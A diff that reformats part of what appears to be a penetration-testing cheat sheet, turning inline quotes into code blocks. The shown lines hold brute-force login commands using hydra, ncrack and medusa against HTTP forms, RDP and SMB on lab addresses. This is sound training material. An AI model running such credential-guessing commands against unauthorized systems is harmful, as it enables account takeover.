@@ -85,7 +85,9 @@ Less common options: -vV = verbose mode, shows you every login attempt hydra tri
 
 Brute-force HTTP Form POST using a username list to try different usernames
 
-> `hydra -L \[username list\] -P \[password list\] 192.168.1.10 \[form parameters\]\[failed login message\]`
+```
+hydra -L [username list] -P [password list] 192.168.1.10 [form parameters] [failed login message]
+```
 
 #### SMB Bruteforce
 
@@ -101,11 +103,15 @@ Brute-force HTTP Form POST using a username list to try different usernames
 
 #### RDP bruteforce
 
-> `ncrack -vv --user offsec -P passwordfile.txt rdp://192.168.11.35`
+ ```
+ ncrack -vv --user offsec -P passwordfile.txt rdp://192.168.11.35
+ ```
 
 #### SMB Bruteforce
 
-> `ncrack –u /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 –p 445`
+```
+ncrack –u /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 –p 445
+```
 
 -U - denotes the path of username list
 
@@ -117,5 +123,7 @@ Brute-force HTTP Form POST using a username list to try different usernames
 
 #### SMB Bruteforce
 
-> `medusa -h 192.168.1.118 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M smbnt`
+```
+medusa -h 192.168.1.118 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M smbnt
+```
 
